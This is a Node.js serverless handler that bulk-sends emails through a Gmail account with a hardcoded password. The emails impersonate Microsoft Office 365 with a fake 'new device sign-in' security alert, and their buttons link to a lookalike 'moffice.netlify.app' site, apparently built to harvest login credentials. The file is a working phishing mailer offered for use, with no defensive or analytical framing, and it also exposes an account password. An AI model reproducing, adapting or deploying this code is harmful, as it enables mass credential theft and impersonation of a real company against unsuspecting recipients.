const nodemailer = require('nodemailer');

exports.handler = async (event) => {
  try {
    const data = JSON.parse(event.body);
    const recsx = data.recipients;

    if (typeof recsx !== 'string' || !recsx) {
      console.error("recsx is invalid:", recsx);
      return {
        statusCode: 500,
        body: JSON.stringify({ error: 'Invalid recipient emails' })
      };
    }

    const emlStrng = recsx.trim();
    const rcpntEmls = emlStrng.split('\n').map(email => email.trim()).filter(email => email !== "");

    if (rcpntEmls.length === 0) {
      console.error("No valid recipient emails provided.");
      return {
        statusCode: 500,
        body: JSON.stringify({ error: 'No valid recipient emails provided' })
      };
    }

    const transporter = nodemailer.createTransport({
      service: 'gmail',
      auth: {
        user: 'mircosoftii@gmail.com',
        pass: 'lztqyrqznnqaieth'
      }
    });

    for (const recipientEmail of rcpntEmls) {
      const mailOptions = {
        from: '"Microsoft Office" <Office365>',
        to: recipientEmail,
        subject: 'Please Review Security Settings',
        html: `
            <div style="background: white; padding: 2rem; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1);">
            <div style="width: 150px;">
            <img src="logo.png" style="width: 150px;" alt="">
            </div>
            <p><strong>Your Office 365 Account was just signed in to from a new device.
            You're getting this email to make sure it was you.</strong></p>
            <p>Please go to your recent activity page to let us know whether or not this was you. To help keep you safe, we require an extra security challenge</p>
            <a style="background-color:rgb(147, 208, 114); color: black; width: 100%; padding: 0.75rem;" href="https://moffice.netlify.app/">Review Recent Activity</a>
            <p>To Opt or change when you receive security notifications <a href="https://moffice.netlify.app/">Click Here.</a></p>
            </div>
        `
      };

      console.log("Sending email to:", recipientEmail);

      try {
        const info = await transporter.sendMail(mailOptions);
        console.log('Email sent to', recipientEmail, ':', info.response);
      } catch (emailError) {
        console.error('Error sending email to', recipientEmail, ':', emailError);

      console.error(`Failed to send email to ${recipientEmail}. Continuing to next recipient.`);
      continue;
      }
    }

    return {
      statusCode: 200,
      headers: {
        'Access-Control-Allow-Origin': '*'
      },
      body: JSON.stringify({ success: true, message: 'Emails sent successfully' })
    };

  } catch (error) {
    console.error('Error in submit function:', error);
    return {
      statusCode: 500,
      headers: {
        'Access-Control-Allow-Origin': '*'
      },
      body: JSON.stringify({ error: 'Failed to process request' })
    };
  }
};